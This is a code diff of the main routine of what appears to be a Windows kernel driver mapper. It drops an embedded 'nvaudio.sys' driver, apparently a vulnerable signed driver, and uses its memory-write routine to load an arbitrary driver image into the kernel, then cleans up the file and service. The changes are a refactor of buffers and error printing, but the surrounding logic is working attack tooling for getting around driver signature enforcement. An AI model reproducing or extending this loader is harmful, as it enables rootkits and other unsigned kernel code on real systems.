@@ -11,10 +11,9 @@ void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
     PVOID ImageBase;
     SIZE_T ImageSize;
     DEVICE_DRIVER_OBJECT Driver;
-    PUNICODE_STRING CurrentPath;
     LPWSTR DeviceName;
-    LPWSTR DriverPath;
     LPWSTR ServiceName;
+    WCHAR DriverPath[MAX_PATH];
 
     if (argc != 2) {
         wprintf(L"[!] invalid arguments.\r\n\t%ws <Driver Path>\r\n", argv[0]);
@@ -30,7 +29,7 @@ void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
     status = NtOpenFile(&fileHandle, FILE_EXECUTE, &objectAttributes, &ioStatus, FILE_SHARE_READ, 0);
 
     if NT_ERROR (status) {
-        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
+        PRINT_ERROR_NTSTATUS(status);
         return;
     }
 
@@ -39,7 +38,7 @@ void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
 
     if NT_ERROR (status) {
         NtClose(fileHandle);
-        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
+        PRINT_ERROR_NTSTATUS(status);
         return;
     }
 
@@ -50,21 +49,18 @@ void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
     NtClose(sectionHandle);
     NtClose(fileHandle);
     if NT_ERROR (status) {
-        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
+        PRINT_ERROR_NTSTATUS(status);
         return;
     }
 
     ServiceName = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\NVR0Internal";
     DeviceName  = L"\\Device\\NVR0Internal";
-    CurrentPath = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
-    DriverPath  = RtlAllocateMemory(MAX_PATH * sizeof(WCHAR));
-
-    StringCchCopyW(DriverPath, MAX_PATH, CurrentPath->Buffer);
+    StringCchCopyW(DriverPath, MAX_PATH, NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer);
     StringCchCatW(DriverPath, MAX_PATH, L"nvaudio.sys");
 
     status = WriteFileFromMemory(DriverPath, NvaudioDriver, sizeof(NvaudioDriver));
     if NT_ERROR (status) {
-        PRINT_ERROR_STATUS(RtlNtStatusToDosError(status));
+        PRINT_ERROR_NTSTATUS(status);
 
         NtUnmapViewOfSection(NtCurrentProcess(), ImageBase);
         return;
@@ -77,13 +73,12 @@ void _cdecl wmain(_In_ int argc, _In_ wchar_t* argv[])
         Driver.WriteMemory = WriteSystemMemory;
 
         status = MmLoadSystemImage(&Driver, ImageBase);
-        wprintf(L"[+] Mapping result: 0x%08X.\r\n", status);
+        wprintf(L"[+] Mapping result: 0x%08X.", status);
 
         UnloadDriver(Driver.DeviceHandle, ServiceName);
     }
 
     DeleteFileFromDisk(DriverPath);
-    RtlFreeMemory(DriverPath);
     NtUnmapViewOfSection(NtCurrentProcess(), ImageBase);
     return;
 }
